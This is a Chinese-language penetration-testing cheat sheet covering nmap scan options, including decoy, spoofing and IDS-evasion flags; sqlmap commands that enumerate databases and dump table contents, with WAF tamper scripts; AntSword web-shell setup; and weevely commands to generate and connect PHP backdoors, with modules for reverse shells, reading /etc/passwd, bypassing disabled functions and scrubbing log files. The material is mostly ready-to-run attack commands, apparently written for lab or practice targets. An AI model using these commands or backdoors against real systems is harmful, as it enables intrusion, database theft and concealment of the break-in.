Tools

nmap

常用

-A依次扫描包含系统探测、版本探测、脚本扫描和跟踪扫描。
-p-全端口扫描。
-p只扫描指定的端口。
-h输出帮助信息。
-Pn将所有主机都默认为在线，跳过主机发现。
-iflist查看本地路由与接口。

目标说明

-iL从已有ip列表文件中读取并扫描。
-iR+随机选择目标进行扫描。
--exclude+ip排除此ip。

主机发现

-sL列出要扫描的ip。
-sn不进行端口扫描。
-Pn叫所有的主机都默认为在线，跳过主机发现。（全面、较慢）
-PS/PA/PU/PY使用TCP、SYN/ACK、UDP或SCTP协议去发现端口。
-PE/PP/PM使用ICMP响应（echo）、时间戳或子网掩码请求来发现探测。
-PO使用IP协议的ping。
-n不做DNS解析。
-R总是做DNS反向解析。
--dns-servers指定自定义的DNS服务器。
--system-dns使用操作系统的DNS。
--traceroute追踪每台主机的跳转路径。

扫描技术

-sS/sT/sA/sW/sM使用SYN、TCP、全连接Connect()、ACK、Window、Maimon来进行扫描。
-sUUDP扫描。
-sN/sF/sX使用TCP Null(无flag)、FIN、Xmas（FIN+Push+Urgent）扫描。
--scanflags +flags自定义TCP扫描的flags。
-sI僵尸机扫描。
-sY/sZ使用SCTP协议的INIT/COOKIE-ECHO扫描。
-sO进行IP协议扫描。
-b <FTP relay host>指定FTP中继主机进行FTP反弹扫描。
--send-eth或--send-ip使用原始以太帧或IP数据包发送。

端口说明和扫描规则

-p-全端口扫描。
-p只扫描指定的端口。
--exclude-ports不对此端口进行扫描。
-F快速模式，扫描比默认端口数量更少的端口。
-r有序地扫描端口而不是随机地扫描。
--top-ports <number>扫描排名指定的数字前几位的最常用的端口。
--port-ratio <ratio>扫描比输入的比例更常用的端口。

服务、版本探测

-sV探测开启的端口来获取服务、版本信息。
-V输出版本号。
--version-intensity <level>设置探测服务、版本信息的强度。
--version-light强度为2的探测强度。
--version-all强度为9的探测强度。
--version-trace将扫描的具体过程显示出来。

脚本扫描

-sC等同于--script=default。
--script=<Lua scripts>指定使用Lua脚本进行扫描。
--script-args=<n1=v1,[n2=v2,...]>指定脚本的参数。
--script-args-file=filename指定提供脚本参数的文件。
--script-trace显示全部发送和收到的数据。
--script-updatedb更新脚本的数据库。
--script-help=<Lua script>显示脚本的相关信息。

防火墙、IDS绕过和欺骗

--proxies <url1,[url2],...>指定代理服务器进行扫描。
--privileged假设用户有全部权限。
--unprivileged假设用户缺少原始套接字权限。
-f;--mtu <val>设置MTU最大传输单元。
-D <诱饵ip1,诱饵ip2,...><目标ip>或-D <RND:number><目标ip>指定多个诱饵IP或者使用RND随机生成number个诱饵IP，对目标主机进行IP欺骗。
-S <ip>伪造源地址。
-e <iface>使用指定的接口。
-g或--source-port <portnum>使用指定的源端口。
--data <hex string>在发送包的数据字段中追加自定义的十六进制字符串。
--data-string <string>在发送报的数据字段中追加自定义的ASCII字符串。
--data-length <num>在发送报的数据字段中追加随机的数据。
--ip-options <options>使用指定的IP选项发送包。
ttl <val>设置TTL值。
--spoof-mac <mac address/prefix/vendor name>伪造源MAC地址。
--badsum发送伪造TCP/UDP/SCTP校验和Checksum的数据包。

SQLMAP

爆数据库名

sqlmap -r E:\Brup_cap\1.txt --dbs --batch
sqlmap -u <url> --cookie="PHPSESSID=dwqedewfqfrfq;security=low" --dbs //cookie为注入点

爆表名

sqlmap -r 1.txt -D <database_name> --tables --batch

爆字段名

sqlmap -r 1.txt -D <database_name> -T <table_name> --columns --batch

字段内容

sqlmap -r 1.txt -D <database_name> -T <table_name> -C <column1,column2…> --dump --batch

试探WAF

sqlmap -u <url> --identify-waf --batch

tamper脚本

sqlmap -u <url> --tamper <模块名>
脚本位置：~/sqlmap/tamper

蚁剑

数据管理-右键-添加数据

  • [URL]要填到.php目录。
  • [连接密码]为[“”]内部的参数。

weevely

生成后门

weevely generate <password> <file>

连接后门

weevely <url> <password> [cmd]

[cmd]

模块名 注释 模块名 注释
:shell_su 通过更变使用者来执行shell命令，可以获得root权限来执行命令 :bruteforce_sql 可用来猜解数据库密码
:shell_sh 执行 shell 命令 :file_find 查找具有给定名称和属性的文件
:shell_php 执行 PHP 命令 :file_download 从远程文件系统下载文件
:system_extensions 收集PHP和webserver扩展列表 :file_check 获取文件的属性和权限
:system_info 收集系统信息 :file_touch 更改文件时间戳
:system_procs 列出正在运行的进程 :file_cd 更改当前工作目录
:audit_disablefunctionbypass 使用mod_cgi和.htaccess绕过系统禁用函数的限制 :file_grep 打印与多个文件中的模式匹配的行
:audit_etcpasswd 查看/etc/passwd文件 :file_gzip 压缩或解压gzip文件
:audit_suidsgid 查找带有SUID或SGID标志的文件 :file_tar 压缩或解压tar文件
:audit_phpconf 查看php配置信息 :file_enum 检查路径列表的存在和权限
:audit_filesystem 审核文件系统的弱权限(找777权限) :file_cp 复制单个文件
:backdoor_reversetcp 执行反向TCP shell.需要nc -lvp 监听 :file_mount 使用HTTPfs挂载远程文件系统
:backdoor_tcp 在TCP端口上生成shell :file_clearlog 从文件中删除字符串
:net_scan TCP端口扫描 :file_zip 压缩或解压zip文件
:net_mail 发送邮件 :file_upload 文件上载到远程文件系统
:net_ifconfig 获取网络接口地址 :file_upload2web 自动将文件上传到Web文件夹并获取相应的URL
:net_curl 执行类似curl的HTTP请求 :file_edit 在本地编辑器上编辑远程文件
:net_proxy 运行本地代理以通过目标转移HTTP/HTTPS浏览 :file_read 从远程文件系统中读取远程文件
:net_phpproxy 在目标上安装PHP代理 :file_webdownload 指定URL下载文件
:file_ls 列出目录内容 :file_rm 删除远程文件
:sql_dump Multi dbms mysqldump replacement :sql_console 执行SQL查询或运行sql控制台
